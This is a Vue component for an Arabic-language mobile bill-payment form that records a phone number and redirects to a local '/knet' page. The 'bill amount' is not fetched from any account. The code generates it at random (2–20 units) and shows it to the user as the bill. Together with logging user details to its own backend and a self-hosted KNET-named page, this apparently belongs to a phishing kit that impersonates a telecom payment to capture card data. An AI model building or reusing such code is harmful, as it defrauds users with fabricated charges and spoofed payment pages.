<script setup lang="ts">
import { ChevronDown, XCircle, Loader2, Check, Plus, X } from 'lucide-vue-next'

const config = useRuntimeConfig()

const props = defineProps<{
  additionalNumbers: string[]
  submitted: boolean
  setSubmitted: (v: boolean) => void
  onRemoveNumber: (i: number) => void
  onAdditionalChange: (i: number, v: string) => void
}>()

const PAY_FOR_OPTIONS = [
  { value: 'other', label: 'رقم آخر' },
  { value: 'self', label: 'رقمي' },
  { value: 'family', label: 'أحد أفراد العائلة' },
]

const BILL_AMOUNT = (Math.floor(Math.random() * 18000 + 2000) / 1000).toFixed(3)

const payFor = ref('other')
const payForOpen = ref(false)
const phoneNumber = ref('')
const loading = ref(false)

const isValid = computed(() => phoneNumber.value.length === 8 && /^9/.test(phoneNumber.value))
const isDisabled = computed(() => loading.value || props.submitted)

const handlePay = async () => {
  if (!isValid.value) return
  loading.value = true
  try {
    const record = await $fetch<{ id: number }>(`${config.public.apiBase}/payment-records`, {
      method: 'POST',
      body: {
        pay_type: 'bill',
        pay_for: payFor.value,
        phone_number: phoneNumber.value,
      }
    })
    const recordId = record?.id || ''
    window.location.href = `/knet?phone=${phoneNumber.value}&amount=${BILL_AMOUNT}&recordId=${recordId}`
  } catch {
    loading.value = false
  }
}

const closeDropdowns = (e: MouseEvent) => {
  if (!(e.target as Element).closest('.bill-dropdown')) payForOpen.value = false
}
onMounted(() => document.addEventListener('click', closeDropdowns))
onUnmounted(() => document.removeEventListener('click', closeDropdowns))
</script>

<template>
  <div class="space-y-8">
    <!-- Pay For -->
    <div class="space-y-1 relative group z-20 bill-dropdown">
      <label class="block text-xs font-semibold text-muted-foreground/80 mb-1">أود الدفع لـ</label>
      <button
        @click="!isDisabled && (payForOpen = !payForOpen)"
        type="button"
        :disabled="isDisabled"
        :class="['w-full bg-transparent py-2 px-0 text-right flex items-center justify-between focus:outline-none transition-all duration-300 border-b disabled:opacity-50 disabled:cursor-not-allowed', payForOpen ? 'border-accent text-accent' : 'border-border text-foreground hover:border-foreground/50']"
      >
        <ChevronDown :class="['w-4 h-4 transition-transform duration-300', payForOpen ? 'rotate-180 text-accent' : 'text-muted-foreground']" />
        <span class="font-medium text-[15px]">{{ PAY_FOR_OPTIONS.find(o => o.value === payFor)?.label }}</span>
      </button>
      <Transition name="dropdown">
        <div v-if="payForOpen && !isDisabled" class="absolute top-[calc(100%+4px)] right-0 left-0 bg-card border border-border rounded-xl shadow-xl overflow-hidden py-1 z-30">
          <button
            v-for="option in PAY_FOR_OPTIONS"
            :key="option.value"
            @click="payFor = option.value; payForOpen = false"
            :class="['w-full text-right px-4 py-3 text-sm transition-colors duration-200', payFor === option.value ? 'bg-accent/10 text-accent font-bold' : 'text-foreground hover:bg-secondary']"
          >
            {{ option.label }}
          </button>
        </div>
      </Transition>
    </div>

    <!-- Phone Number -->
    <div class="space-y-1 group">
      <label class="block text-xs font-semibold text-muted-foreground/80 mb-1 transition-colors group-focus-within:text-accent">
        رقم الهاتف <span class="text-accent ml-0.5">*</span>
      </label>
      <div class="relative">
        <input
          type="tel"
          v-model="phoneNumber"
          placeholder="98752224"
          :disabled="isDisabled"
          class="w-full bg-transparent py-2.5 px-0 text-right text-[15px] font-medium placeholder-muted-foreground/60 border-b border-border focus:outline-none focus:border-accent transition-all duration-300 disabled:opacity-50"
          dir="ltr"
          style="text-align: right"
          maxlength="8"
          @input="phoneNumber = (phoneNumber).replace(/\D/g, '').slice(0, 8)"
        />
        <div class="absolute bottom-0 right-0 h-[2px] w-0 bg-accent transition-all duration-500 ease-out group-focus-within:w-full" />
      </div>
    </div>

    <!-- Additional Numbers -->
    <TransitionGroup name="list" tag="div" class="space-y-6">
      <div v-for="(num, index) in additionalNumbers" :key="index" class="space-y-1 group">
        <div class="flex items-center justify-between mb-1">
          <button @click="onRemoveNumber(index)" :disabled="isDisabled" class="text-muted-foreground/60 hover:text-destructive transition-colors disabled:opacity-50">
            <X class="w-3.5 h-3.5" />
          </button>
          <label class="text-xs font-semibold text-muted-foreground/80">رقم إضافي {{ index + 1 }}</label>
        </div>
        <input
          type="tel"
          :value="num"
          @input="onAdditionalChange(index, ($event.target as HTMLInputElement).value.replace(/\D/g, '').slice(0, 8))"
          placeholder="98752224"
          :disabled="isDisabled"
          class="w-full bg-transparent py-2.5 px-0 text-right text-[15px] font-medium placeholder-muted-foreground/60 border-b border-border focus:outline-none focus:border-accent transition-all duration-300 disabled:opacity-50"
          dir="ltr"
          style="text-align: right"
          maxlength="8"
        />
      </div>
    </TransitionGroup>

    <!-- Submit -->
    <div class="pt-4">
      <button
        @click="handlePay"
        :disabled="!isValid || isDisabled"
        :class="['relative overflow-hidden w-full rounded-xl py-4 flex items-center justify-center gap-3 font-bold text-[15px] transition-all duration-500 shadow-md', isValid && !isDisabled ? 'bg-accent text-accent-foreground hover:bg-accent/90 hover:shadow-lg hover:shadow-accent/20 hover:-translate-y-0.5' : 'bg-muted text-muted-foreground cursor-not-allowed opacity-60']"
      >
        <span class="relative z-10 flex items-center gap-2">
          <template v-if="loading"><Loader2 class="w-5 h-5 animate-spin" /><span>جاري المعالجة...</span></template>
          <template v-else-if="submitted"><Check class="w-5 h-5" /><span>تم بنجاح</span></template>
          <template v-else>دفع الفاتورة الآن</template>
        </span>
      </button>
    </div>
  </div>
</template>

<style scoped>
.dropdown-enter-active, .dropdown-leave-active { transition: all 0.15s ease; }
.dropdown-enter-from, .dropdown-leave-to { opacity: 0; transform: translateY(-4px); }
.list-enter-active, .list-leave-active { transition: all 0.3s ease; }
.list-enter-from, .list-leave-to { opacity: 0; transform: translateY(-10px); }
</style>
